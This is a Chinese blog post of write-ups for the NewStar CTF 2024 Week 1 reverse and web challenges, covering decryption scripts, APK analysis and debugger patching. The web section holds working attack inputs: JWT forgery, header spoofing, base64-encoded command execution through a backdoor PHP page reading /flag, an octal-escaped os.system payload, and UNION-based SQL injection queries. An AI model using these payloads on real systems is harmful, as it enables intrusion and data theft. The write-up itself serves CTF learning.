@@ -1,0 +1,247 @@
+<!DOCTYPE html><html lang="zh-cn" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>2024CtfNewStar Week1 Re&amp;Web-wp | huanghunr's Blog</title><meta name="author" content="huanghunr"><meta name="copyright" content="huanghunr"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#FFF8F0"><meta name="description" content="CTFNewStar2024 Week1 题目Re和Web的Witeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2024CtfNewStar Week1 Re&amp;Web-wp">
+<meta property="og:url" content="http://example.com/2024/10/26/CTFNewStar2024-Week1-wp/index.html">
+<meta property="og:site_name" content="huanghunr&#39;s Blog">
+<meta property="og:description" content="CTFNewStar2024 Week1 题目Re和Web的Witeup">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/tx4.jpg">
+<meta property="article:published_time" content="2024-10-25T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-08-24T16:00:00.000Z">
+<meta property="article:author" content="huanghunr">
+<meta property="article:tag" content="re,WriteUp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/tx4.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "2024CtfNewStar Week1 Re&Web-wp",
+  "url": "http://example.com/2024/10/26/CTFNewStar2024-Week1-wp/",
+  "image": "http://example.com/img/tx4.jpg",
+  "datePublished": "2024-10-25T16:00:00.000Z",
+  "dateModified": "2025-08-24T16:00:00.000Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "huanghunr",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="http://example.com/2024/10/26/CTFNewStar2024-Week1-wp/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#402218')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#FFF8F0')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":400,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: true,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '2024CtfNewStar Week1 Re&Web-wp',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/tx4.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">huanghunr's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">2024CtfNewStar Week1 Re&amp;Web-wp</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">2024CtfNewStar Week1 Re&amp;Web-wp</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-10-25T16:00:00.000Z" title="Created 2024-10-26 00:00:00">2024-10-26</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-08-24T16:00:00.000Z" title="Updated 2025-08-25 00:00:00">2025-08-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/WriteUp/">WriteUp</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.6k</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h1><p><a target="_blank" rel="noopener" href="https://pan.baidu.com/s/1B9yk8TUxxE-I7zb4FUD8Cw?pwd=d0rs">(・∀・)つ原题</a> </p>
+<h2 id="base64"><a href="#base64" class="headerlink" title="base64"></a>base64</h2><p>Die 发现是 PE64，直接丢入 ide64，函数名混乱，直接 shift+f12，查找用”Enter the flag: “ 进入主函数，发现输入的值 str 为 26 位然后被 sub_7FF706EE14E0(Str, 26, Str1)加密输出为 str1，再与 g84Gg6m2ATtVeYqUZ9xRnaBpBvOVZYtj+Tc&#x3D;比较相等即 str 是 flag 值.<br>进入sub_7FF706EE14E0()函数，再由题目提示的 base64 丁帧为 base64 加密函数，并找到了一个字符串 WHydo3sThiS7ABLElO0k5trange+CZfVIGRvup81NKQbjmPzU4MDc9Y6q2XwFxJ&#x2F; ,一眼就是密钥 .</p>
+<p>直接用密钥 base64 解密得 flag</p>
+<hr>
+<h2 id="ezAndroidStudy"><a href="#ezAndroidStudy" class="headerlink" title="ezAndroidStudy"></a>ezAndroidStudy</h2><p>apk 先安装看一看，全是提示就跟着提示来<br>activity 有个 work.pangbai.ezandroidstudy.Homo 的页面,直接搜索进入拿下 flag 第一段 flag{Y0u<br>发现flag字符转被定义在一个名为flag1的变量里，于是推测有flag2,直接搜索 flag2，拿下flag2的值为 _@r4。<br>同样搜索 flag3，直接拿下 flag3 的值为_900d。<br>flag4 在提示的目录下为_andr01d.<br>第五步提示要逆向 so 文件（c 语言），于是找到在 lib&#x2F;arm64-v8a 下的so 文件，提取出来直接丢入 ida64，shift+f12 在libezandroidstudy.so 文件中找到最后flag，_r4V4rs4r}</p>
+<hr>
+<h2 id="Simple-encryption"><a href="#Simple-encryption" class="headerlink" title="Simple_encryption"></a>Simple_encryption</h2><p>查壳拖进 ida64，简单的算法，脚本如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buffer[<span class="number">32</span>] = &#123;</span><br><span class="line"><span class="number">0x47</span>, <span class="number">0x95</span>, <span class="number">0x34</span>, <span class="number">0x48</span>, <span class="number">0xA4</span>, <span class="number">0x1C</span>, <span class="number">0x35</span>, <span class="number">0x88</span>, <span class="number">0x64</span>, <span class="number">0x16</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0x14</span>, <span class="number">0x6A</span>, <span class="number">0x39</span>,</span><br><span class="line"><span class="number">0x12</span>,</span><br><span class="line"><span class="number">0xA2</span>, <span class="number">0x0A</span>, <span class="number">0x37</span>, <span class="number">0x5C</span>, <span class="number">0x07</span>, <span class="number">0x5A</span>, <span class="number">0x56</span>, <span class="number">0x60</span>, <span class="number">0x12</span>, <span class="number">0x76</span>, <span class="number">0x25</span>, <span class="number">0x12</span>, <span class="number">0x8E</span>, <span class="number">0x28</span>, <span class="number">0x00</span>,</span><br><span class="line"><span class="number">0x00</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">0</span>) &#123;</span><br><span class="line">buffer[i] += <span class="number">31</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">1</span>) &#123;</span><br><span class="line">buffer[i] -= <span class="number">41</span>;</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (i % <span class="number">3</span> == <span class="number">2</span>) &#123;</span><br><span class="line">buffer[i] ^= <span class="number">0x55u</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>输出 flag{IT_15_R3Al1y_V3Ry-51Mp1e}</p>
+<hr>
+<h2 id="ez-debug"><a href="#ez-debug" class="headerlink" title="ez_debug"></a>ez_debug</h2><p>用 ida 看了一下代码，发现最后有个输出是解密 flag 的，但是并没有发现加密的 flag 值，<br>于是就用 ida 动态调试看值，但是 ida 中的编译代码很乱，难以看懂，比较的两个值也<br>不是 flag 加密的值，所以尝试跳过比较去直接输出 Decrypted flag，然而并没有东西。<br>再 看 题 目 发 现 提 示 用 xdbg ， 于 是 用 xdbg 调 试 ， 在 0000000000401CB3 的 je<br>0x0000000000401CD9 处断点修改 ZF 的值为 0，使其执行 right 部分的代码，再在输出<br>Decrypted flag 的后面断点，发现 flag 已经在右侧显示出来了<br>flag{y0u_ar3_g0od_@_Debu9}</p>
+<hr>
+<h2 id="begin"><a href="#begin" class="headerlink" title="begin"></a>begin</h2><p>全程提示<br>Main 函数中 F5 后点击&amp;flag_part1，按 a 转换字符串<br>Shift+f12，看到第二部分<br>定位字符串的函数，然后按 x 再定位到调用的函数，函数名就是 flag 的第三部分<br>flag{Mak3_aN_3Ff0rt_tO_5eArcH_F0r_th3_f14g_C0Rpse}</p>
+<hr>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="PangBai-过家家（1）"><a href="#PangBai-过家家（1）" class="headerlink" title="PangBai 过家家（1）"></a>PangBai 过家家（1）</h2><p>跟随提示<br>Leve1 在请求头的 localtion 中找到868f4249-8170-4ece-909b-36ad36e6037f，<br>直接输入跳转地址<br>Get 传参 ？Ask&#x3D;miao<br>Post say&#x3D;hello<br>Post say&#x3D;flag<br>提示 Agent 为 Papa，修改请求头 User-Agent 为 Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64)AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Papa&#x2F;129.0.0.0 Safari&#x2F;537.36<br>Post say&#x3D;玛卡巴卡阿卡哇卡米卡玛卡呣<br>提示上传文件，在本地电脑上创建一个任意名字的 zip 压缩包，并将 cookie 复制到<br>postman，再用 postman 以 PACTH 方式上传压缩包，提示“玛卡巴卡阿卡哇卡米卡玛卡<br>呣”必不可少，于是再上传一个 key 为 say 的 text 句子，value 为玛卡巴卡阿卡哇卡米<br>卡玛卡呣。<br>提示 jwt，密钥为 0ZmeYwg8aIgb2jVC，了解到可以 jwt 伪造，先对当前 cookie 解密发现<br>有一个 level：6 的内容，但是不知道伪造的值是多少，先尝试修改为 7，输入后不通过，<br>后看剧情猜测可能是 0，于是修改为 0，直接通过。<br>提示要成为 Pangbai 的家人，Localhost，使用 hackbar 直接添加 X-Forwarded-For 的值为<br>Localhost<br>点击页面上的按钮获取 flag</p>
+<hr>
+<h2 id="Headach3"><a href="#Headach3" class="headerlink" title="Headach3"></a>Headach3</h2><p>提示 header，F12 看请求头，一眼 flag，flag{You_Ar3_R3Ally_A_9ooD_d0ctor}</p>
+<hr>
+<h2 id="会赢吗"><a href="#会赢吗" class="headerlink" title="会赢吗"></a>会赢吗</h2><p>F12 查看源码，发现 flag 第一部分 ZmxhZ3tXQTB3 和&#x2F;4cqu1siti0n<br>，转入&#x2F;4cqu1siti0n，提示 js 的用法，于是查看 js 脚本源码，发现了 async function<br>revealFlag(className)这个函数请求一个 classname 的参数，并看到了控制台的提示课程<br>名为 4cqu1siti0n。但是发现原页面并没调用这个段 js 脚本，于是在控制台手动调用，<br>输入 revealFlag(“4cqu1siti0n”);,成功拿到第二段 flag 为 IV95NF9yM2Fs，并提示前往&#x2F;s34l。<br>查看源码，发现有获取 flag 的 js 脚本，分析只要 stateElement.textContent &#x3D;&#x3D;&#x3D; ‘解封’,就可以运行 js，于是在 if 判断处断点，在控制台输入 stateElement.textContent&#x3D;”解封”，把值修改为正确的值，运行后得 flag 为 MXlfR3I0c1B，提示下一关在&#x2F;Ap3x，<br>转到&#x2F;Ap3x，发现有 js 脚本阻止我们提交按钮，直接在浏览器设置中禁用 js，再点击按钮获得 flag</p>
+<hr>
+<h2 id="智械危机"><a href="#智械危机" class="headerlink" title="智械危机"></a>智械危机</h2><p>根据题目提示的 robot，访问 robots.txt，提示&#x2F;backd0or.php<br>转到&#x2F;backd0or.php，进入后发现是 php 代码，分析代码发现要 POST 两个参数 cmd 和 key。<br>并且有个execute_cmd()函数中有 system()函数，于是想办法把 linux 指令传入<br>system 中执行。<br>再细致分析 If 判断就会执行 execute_cmd()，于是先看decrypt_request()函数，这个函数的返回值是 cmd 的 base64 解码的值，所以<br>我们要先把我们要执行的命令（cmd）进行 base64 编码，再函数内部会把我们的 cmd<br>值进行反转并取 md5 值，并和被 base64 解码的 key 值比较，相等就会 return。<br>所以我们的操作就是:选取 linux 命令的值–&gt;把值进行 base64 编码–&gt;post 传入 cmd 中–&gt;反转 cmd(反转的脚本如下)–&gt;把反转的 cmd 进行 md5–&gt;进行 base64 编码–&gt;POST 传入key 中.<br>找 flag 的 位 置 (ls &#x2F;)，harkbar POST 传 入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=bHMgLw==&amp;key=ZTk0ZDNmOWQyNzBmNTczNGMwZTYwNDY3ZDQ0ZTdkNDY=</span><br></pre></td></tr></table></figure>
+<p>发现名为 flag 的 文 件 ， 直 接 用 cat &#x2F;flag 打 开 ， 所 以 要 传 入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=Y2F0IC9mbGFn&amp;key=ODc5YTU5MWM2Nzg1YTRlMTM5OGI5NmE5YTFiYzY3ZWI=</span><br></pre></td></tr></table></figure>
+<p>flag{b302ad78-b283-431a-8ad5-2a24702d218c}</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">reverse</span>(<span class="params">s</span>):</span><br><span class="line"><span class="keyword">return</span> s[::-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(reverse(<span class="string">&quot;&quot;</span>))</span><br></pre></td></tr></table></figure>
+<hr>
+<h2 id="谢谢皮蛋"><a href="#谢谢皮蛋" class="headerlink" title="谢谢皮蛋"></a>谢谢皮蛋</h2><p>xxxxxxxxxx \157\163\56\163\171\163\164\145\155\50\47\143\141\164\40\57\146\154\141\147\47\51s</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,GROUP_CONCAT(table_name) <span class="keyword">FROM</span> information_schema.tables <span class="keyword">WHERE</span> TABLE_SCHEMA<span class="operator">=</span>database();#</span><br></pre></td></tr></table></figure>
+<p>里面发现有一个Fl4g 的表，但是不知道里面的列名，所以继续查找列名,输入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns;#</span><br></pre></td></tr></table></figure>
+<p>查找列名有点多，可以搜索关键词 flag，发现里面有 FLAG 的列和一些其他的列名,输入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="number">1</span>,FLAG <span class="keyword">FROM</span> Fl4g;#</span><br></pre></td></tr></table></figure>
+<p>获取 flag 值显示没有这个列表，说明 FLAG 不是<br>存放 flag 的地方。注意到刚刚查出来的列里面 FLAG 旁边有一个叫 value 的列，猜测可能是，所以输入</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">SELECT</span> <span class="number">1</span>,<span class="keyword">value</span> <span class="keyword">FROM</span> Fl4g;# </span><br></pre></td></tr></table></figure>
+<p>flag{89437dd4-53f9-4bb9-8702-ad94e1580be1}</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">huanghunr</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2024/10/26/CTFNewStar2024-Week1-wp/">http://example.com/2024/10/26/CTFNewStar2024-Week1-wp/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/re-WriteUp/">re,WriteUp</a></div><div class="post-share"><div class="social-share" data-image="/img/tx4.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2024/10/26/CtfNewStar-Week2-wp/" title="2024CtfNewStar Week2 Re&amp;Web-wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">2024CtfNewStar Week2 Re&Web-wp</div></div><div class="info-2"><div class="info-item-1">Reverse(✿･ω･)&#x2F;原题 drink_tea查壳后丢进ida，在main函数中发现加密函数，密钥和加密后的密文。分析加密函数，发现tea加密的特征deltea值，于是把密钥的值按d变为dd形式的数据，拿到4个密钥，然后提取出密文写脚本解密，把加密过程反过来就行。脚本如下。   123456789101112131415161718192021222324252627282930313233343536373839404142434445#include &lt;stdio.h&gt;int __fastcall dec(unsigned int* input, unsigned int* key_1);int main() &#123;   unsigned char m[32] = &#123;        0x78, 0x20, 0xF7, 0xB3, 0xC5, 0x42, 0xCE, 0xDA,        0x85, 0x59, 0x21, 0x1A, 0x26, 0x56, 0x5A, 0x59,        0x29, 0x02, 0x0D,...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/04/04/2025%E8%85%BE%E8%AE%AF%E6%B8%B8%E6%88%8F%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF%E7%AB%9E%E8%B5%9B-PC%E5%AE%A2%E6%88%B7%E7%AB%AF%E5%AE%89%E5%85%A8-%E5%88%9D%E8%B5%9B/" title="2025腾讯游戏安全技术竞赛-PC客户端安全-初赛（复现）"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-04-04</div><div class="info-item-2">2025腾讯游戏安全技术竞赛-PC客户端安全-初赛（复现）</div></div><div class="info-2"><div class="info-item-1">复现题目旨在了解题目的逻辑~~~~，可能与真正的解题流程有出入 先看main函数 首先，加载了ACEDriverSDK，里面有许多函数，我们先标出函数的作用。  在虚表中我们可以看到下面这两个函数，一个是用于后面base58表的初始化的，还有一个就是反调试函数。  根据作用大致恢复一下结构体(命名函数时会自动修改)。 12345678910111213141516struct ACEDriverSDK_vftable&#123;  void *creat_vftable;  __int64 (__fastcall *initserver)(ACEDriverSDK_vftable **a1, char *a2, __int64 a3);  __int64 (__fastcall *closeserver)(ACEDriverSDK_vftable **a1, __int64 a2);  _BOOL8 (__fastcall *startserver)(ACEDriverSDK_vftable **a1, SC_HANDLE hSCManager, const WCHAR *lpS...</div></div></div></a><a class="pagination-related" href="/2024/11/10/2024%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B/" title="2024浙江省省赛 Re-wp+复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-11-10</div><div class="info-item-2">2024浙江省省赛 Re-wp+复现</div></div><div class="info-2"><div class="info-item-1">(・∀・)つ原题(提取码: d9sa) 初赛ezre一个python字节码文件，可以用pycdas查看字节码。我们借此来分析一下python字节码文件的结构。 涉及到闭包函数的内容，总的来说闭包就是函数被定义在了函数里面。 闭包，看这一篇就够了——带你看透闭包的本质，百发百中-CSDN博客 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153...</div></div></div></a><a class="pagination-related" href="/2024/10/28/CTFNewStar2024-Week3-wp/" title="2024CtfNewStar Week3 Re&amp;Web-wp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2024-10-28</div><div class="info-item-2">2024CtfNewStar Week3 Re&amp;Web-wp</div></div><div class="info-2"><div class="info-item-1">Reverse(・∀・)つ原题  simpleAndroid打开后发现了一个checkActivity的文件里发现我们输入的字符串被传到了so文件里加密，于是解压出so文件丢入ida分析，找到了一个datacheck函数，一进去就发现了一个base64编码和编码密钥。加密代码看似很多其实总共就两次，一次是反转，还有一次是一个”|”和”&amp;”运算，把反转后的字符串逐个进行运算，最后和密文进行比较。直接抄下来就行，解密脚本反一下就行，先运算后反转（脚本如下）最后用密钥在赛博厨师解base64编码就行。 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned char data_1[32] = &#123;    0xB2, 0x74, 0x45, 0x16, 0x47, 0x34, 0x95, 0x36, 0x17, 0xF4, 0x43, 0x95, 0x03, 0xD6, 0x33, 0x95,    ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/tx4.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">huanghunr</div><div class="author-info-description"></div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">41</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/huanghunr"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#reverse"><span class="toc-number">1.</span> <span class="toc-text">reverse</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#base64"><span class="toc-number">1.1.</span> <span class="toc-text">base64</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ezAndroidStudy"><span class="toc-number">1.2.</span> <span class="toc-text">ezAndroidStudy</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Simple-encryption"><span class="toc-number">1.3.</span> <span class="toc-text">Simple_encryption</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-debug"><span class="toc-number">1.4.</span> <span class="toc-text">ez_debug</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" 